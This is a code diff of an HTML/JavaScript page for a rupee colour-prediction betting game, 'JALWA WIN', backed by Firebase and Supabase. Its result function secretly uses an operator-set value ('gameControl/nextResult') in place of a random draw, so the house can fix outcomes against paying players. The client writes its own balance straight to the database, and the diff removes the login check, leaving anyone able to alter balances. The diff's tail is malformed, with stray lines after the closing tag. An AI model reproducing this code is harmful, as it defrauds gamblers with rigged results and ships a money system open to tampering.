@@ -7,6 +7,7 @@
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         :root { --green: #1DB954; --violet: #673AB7; --red: #F44336; --blue: #007AFF; --dark: #333; --gold: #FFD700; }
         body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #EBEDF0; user-select: none; padding-bottom: 50px; }
@@ -25,26 +26,29 @@
         .order-table th { background: #f1f1f1; padding: 10px; text-align: center; color: #666; }
         .order-table td { padding: 12px 8px; border-bottom: 1px solid #eee; text-align: center; }
         
-        #betModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 2000; justify-content: center; align-items: center; }
-        .bet-box { background: white; width: 90%; max-width: 380px; border-radius: 20px; overflow: hidden; animation: slideUp 0.3s; }
-        .bet-head { padding: 15px; color: white; font-weight: bold; text-align: center; font-size: 18px; }
-        .bet-body { padding: 20px; text-align: center; }
-        .chips-row { display: flex; justify-content: space-between; margin: 15px 0; gap: 8px; }
-        .chip { flex: 1; padding: 10px 0; background: #f5f5f5; border-radius: 8px; font-weight: bold; cursor: pointer; border: 1px solid #ddd; }
-        .chip.active { background: var(--blue); color: white; }
-        .stepper { display: flex; justify-content: center; align-items: center; gap: 25px; margin: 25px 0; }
-        .step-btn { width: 40px; height: 40px; border-radius: 50%; border: 1px solid #ddd; background: #f8f9fa; font-size: 20px; }
-        #displayAmt { font-size: 28px; font-weight: bold; color: var(--blue); }
-        .confirm-btn { width: 100%; padding: 16px; border: none; background: var(--blue); color: white; font-weight: bold; border-radius: 12px; }
-
-        #ticketOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 3000; justify-content: center; align-items: center; }
-        .ticket { background: white; width: 85%; max-width: 320px; border-radius: 20px; text-align: center; overflow: hidden; }
-        .t-head { padding: 20px; color: white; font-weight: bold; font-size: 22px; }
-        .t-ball { width: 80px; height: 80px; border-radius: 50%; margin: 20px auto; display: flex; align-items: center; justify-content: center; font-size: 40px; color: white; }
+        /* MODALS */
+        #betModal, #ticketOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 3000; justify-content: center; align-items: center; }
+        .bet-box, .ticket { background: white; width: 90%; max-width: 350px; border-radius: 20px; overflow: hidden; animation: zoomIn 0.3s; }
+        @keyframes zoomIn { from {transform: scale(0.8); opacity: 0;} to {transform: scale(1); opacity: 1;} }
         
+        .bet-head, .t-head { padding: 15px; color: white; font-weight: bold; text-align: center; font-size: 18px; }
+        .bet-body, .t-body { padding: 20px; text-align: center; }
+        
+        .chips-row { display: flex; justify-content: space-between; margin: 15px 0; gap: 8px; }
+        .chip { flex: 1; padding: 10px 0; background: #f5f5f5; border-radius: 8px; font-weight: bold; cursor: pointer; border: 1px solid #ddd; text-align: center; }
+        .chip.active { background: var(--blue); color: white; border-color: var(--blue); }
+        
+        .stepper { display: flex; justify-content: center; align-items: center; gap: 25px; margin: 20px 0; }
+        .step-btn { width: 40px; height: 40px; border-radius: 50%; border: 1px solid #ddd; background: #f8f9fa; font-size: 20px; font-weight: bold; }
+        #displayAmt { font-size: 28px; font-weight: bold; color: var(--blue); }
+        
+        .confirm-btn { width: 100%; padding: 16px; border: none; background: var(--blue); color: white; font-weight: bold; border-radius: 12px; font-size: 16px; }
+        .t-ball { width: 80px; height: 80px; border-radius: 50%; margin: 10px auto; display: flex; align-items: center; justify-content: center; font-size: 40px; color: white; font-weight: bold; }
+
         #toast { visibility: hidden; background: #333; color: #fff; padding: 12px 25px; border-radius: 30px; position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%); z-index: 4000; }
         #toast.show { visibility: visible; animation: fadeInOut 2s; }
         @keyframes fadeInOut { 0%,100% { opacity:0; } 20%,80% { opacity:1; } }
+
         .c-Red { background: var(--red); } .c-Green { background: var(--green); } .c-Violet { background: var(--violet); } 
         .Mix { background: linear-gradient(135deg, var(--red) 50%, var(--violet) 50%); }
         .MixG { background: linear-gradient(135deg, var(--green) 50%, var(--violet) 50%); }
@@ -54,13 +58,13 @@
 <body>
 
 <div class="nav">
-    <span onclick="location.href='dashboard.html'"><i class="fas fa-arrow-left"></i> JALWA WIN</span>
+    <span>JALWA WIN</span>
     <div>₹<span id="balDisplay">0.00</span></div>
 </div>
 
 <div class="card">
-    <div><div style="color:#999; font-size:12px">Period</div><div id="pIdDisplay" style="font-weight:bold; font-size:18px">...</div></div>
-    <div class="timer" id="timerDisplay">00:30</div>
+    <div><div style="color:#999; font-size:12px">Period</div><div id="pIdDisplay" style="font-weight:bold; font-size:16px">...</div></div>
+    <div class="timer" id="timerDisplay">00:00</div>
 </div>
 
 <div class="btn-row">
@@ -113,11 +117,11 @@
 
 <div id="ticketOverlay">
     <div class="ticket">
-        <div id="tHead" class="t-head">WINNER</div>
-        <div style="padding:20px;">
-            <div id="tBall" class="t-ball">0</div>
-            <div id="tStatus" style="font-weight:bold; font-size:20px;">Congratulations!</div>
-            <div id="tWinAmt" style="font-size:24px; color:var(--green); margin:10px 0;">+₹0.00</div>
+        <div id="tHead" class="t-head">RESULT</div>
+        <div class="t-body">
+            <div id="tBall" class="t-ball">?</div>
+            <div id="tStatus" style="font-weight:bold; font-size:20px; margin-top:10px;">Status</div>
+            <div id="tWinAmt" style="font-size:24px; margin:10px 0;">₹0.00</div>
             <button class="confirm-btn" onclick="document.getElementById('ticketOverlay').style.display='none'">CLOSE</button>
         </div>
     </div>
@@ -129,24 +133,17 @@
     const firebaseConfig = { databaseURL: "https://jalwa-v2-ad222-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
+    
     const SB_URL = "https://orksbkahfantwdbwzrye.supabase.co"; 
     const SB_KEY = "sb_publishable_F7ErxCXZz7Zpcpd2-yH-Bg_qDFL8tUI";
     const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
 
-    // USER DATA SYNC
-    const userId = localStorage.getItem('jalwa_id');
-    let userBalance = 0;
-    let currentP = "", selectedType = "", baseAmt = 10, multiplier = 1, myBets = [];
+    const userId = localStorage.getItem('jalwa_id') || 'test_user';
+    let userBalance = 0, currentP = "", selectedType = "", baseAmt = 10, multiplier = 1, myBets = [];
 
-    if(!userId) window.location.replace("login.html");
-
-    // Live Balance Listener
+    // Sync Balance
     db.ref('users/' + userId).on('value', snap => {
-        const data = snap.val();
-        if(data) {
-            userBalance = Number(data.balance || 0);
-            document.getElementById('balDisplay').innerText = userBalance.toFixed(2);
-        }
+        if(snap.val()) { userBalance = Number(snap.val().balance || 0); document.getElementById('balDisplay').innerText = userBalance.toFixed(2); }
     });
 
     function openBet(type) {
@@ -158,7 +155,103 @@
     }
 
     function setBase(v, el) {
-        baseAmt = v;
+        baseAmt = v; document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
+        el.classList.add('active'); updateBetUI();
+    }
+
+    function multAmt(v) { multiplier += v; if(multiplier < 1) multiplier = 1; updateBetUI(); }
+    function updateBetUI() { document.getElementById('displayAmt').innerText = multiplier; document.getElementById('totalTxt').innerText = baseAmt * multiplier; }
+
+    async function confirmBet() {
+        const total = baseAmt * multiplier;
+        if(userBalance < total) { showToast("Insufficient Balance!"); return; }
+        await db.ref('users/' + userId).update({ balance: userBalance - total });
+        const betObj = { pid: currentP, sel: selectedType, amt: total, status: 'Wait', win: 0 };
+        myBets.push(betObj);
+        db.ref('bets/' + currentP).push({ ...betObj, uid: userId });
+        document.getElementById('betModal').style.display = 'none';
+        updateOrderTable(); showToast("Bet Placed!");
+    }
+
+    async function pushResult(pid) {
+        const snap = await db.ref('gameControl/nextResult').once('value');
+        let n = snap.val();
+        if(n !== null) await db.ref('gameControl/nextResult').set(null);
+        else n = Math.floor(Math.random() * 10);
+        
+        if(n === "Green") n = 3; else if(n === "Red") n = 4; else if(n === "Violet") n = 5;
+        n = Number(n);
+        let col = (n===0||n===5)?(n===0?"Red":"Green"):(n%2===0?"Red":"Green");
+        
+        await supabaseClient.from('game_history').insert([{ pid: pid, num: n, col: col }]);
+        
+        let periodWin = 0;
+        let hasActiveBet = false;
+
+        myBets.forEach(b => {
+            if(b.pid === pid && b.status === 'Wait') {
+                hasActiveBet = true; // User ne is period me bet lagayi thi
+                let isWin = false, m = 2;
+                if(b.sel == n) { isWin=true; m=9; }
+                else if(b.sel==='Green' && (n%2!==0 || n===5)) { isWin=true; m=(n===5)?1.5:2; }
+                else if(b.sel==='Red' && (n%2===0 || n===0)) { isWin=true; m=(n===0)?1.5:2; }
+                else if(b.sel==='Violet' && (n===0 || n===5)) { isWin=true; m=4.5; }
+                
+                if(isWin) { b.win = b.amt * m; b.status = 'Win'; periodWin += b.win; }
+                else b.status = 'Loss';
+            }
+        });
+
+        if(periodWin > 0) await db.ref('users/' + userId).update({ balance: userBalance + periodWin });
+
+        // FIX: Sirf tab dikhao jab bet lagayi ho
+        if(hasActiveBet) {
+            showTicket(n, (n===0?'Mix':(n===5?'MixG':'c-'+col)), periodWin);
+        }
+
+        updateOrderTable();
+        fetchHistory();
+    }
+
+    function showTicket(n, cl, win) {
+        document.getElementById('ticketOverlay').style.display='flex';
+        document.getElementById('tBall').innerText = n;
+        document.getElementById('tBall').className = "t-ball " + cl;
+        document.getElementById('tHead').innerText = win > 0 ? "WINNER" : "LOSE";
+        document.getElementById('tHead').style.background = win > 0 ? "#1DB954" : "#444";
+        document.getElementById('tStatus').innerText = win > 0 ? "Congratulations!" : "Try Again";
+        document.getElementById('tWinAmt').innerText = win > 0 ? "+₹" + win.toFixed(2) : "-₹";
+        document.getElementById('tWinAmt').style.color = win > 0 ? "#1DB954" : "#F44336";
+    }
+
+    function updateOrderTable() {
+        let h = ""; [...myBets].reverse().slice(0,10).forEach(b => {
+            let resCl = b.status==='Win'?'win-amt':(b.status==='Wait'?'':'loss-amt');
+            h += `<tr><td>${b.pid.slice(-4)}</td><td>${b.sel}</td><td>₹${b.amt}</td><td class="${resCl}">${b.status==='Wait'?'Wait':(b.status==='Win'?'+₹'+b.win:'-₹'+b.amt)}</td></tr>`;
+        });
+        document.getElementById('orderBody').innerHTML = h;
+    }
+
+    async function fetchHistory() {
+        const { data } = await supabaseClient.from('game_history').select('*').order('id', { ascending: false }).limit(20);
+        if(data) document.getElementById('historyGrid').innerHTML = data.map(r => `<div class="dot ${r.num==0?'Mix':(r.num==5?'MixG':'c-'+r.col)}">${r.num}<span class="dot-pid">${String(r.pid).slice(-3)}</span></div>`).join('');
+    }
+
+    function showToast(msg) { const t = document.getElementById("toast"); t.innerText = msg; t.className="show"; setTimeout(()=>t.className="", 2000); }
+
+    setInterval(() => {
+        const now = new Date(); const sec = now.getSeconds();
+        const pId = now.getFullYear().toString() + (now.getMonth()+1).toString().padStart(2,'0') + now.getDate().toString().padStart(2,'0') + "30" + Math.floor(((now.getHours()*3600)+(now.getMinutes()*60)+sec)/30);
+        document.getElementById('timerDisplay').innerText = `00:${(30-sec%30).toString().padStart(2,'0')}`;
+        document.getElementById('pIdDisplay').innerText = pId;
+        if (currentP !== pId) { if (currentP !== "") pushResult(currentP); currentP = pId; fetchHistory(); }
+    }, 1000);
+
+    window.onload = fetchHistory;
+</script>
+</body>
+</html>
+  baseAmt = v;
         document.querySelectorAll('.chip').forEach(c => c.classList.remove('active'));
         el.classList.add('active'); updateBetUI();
     }
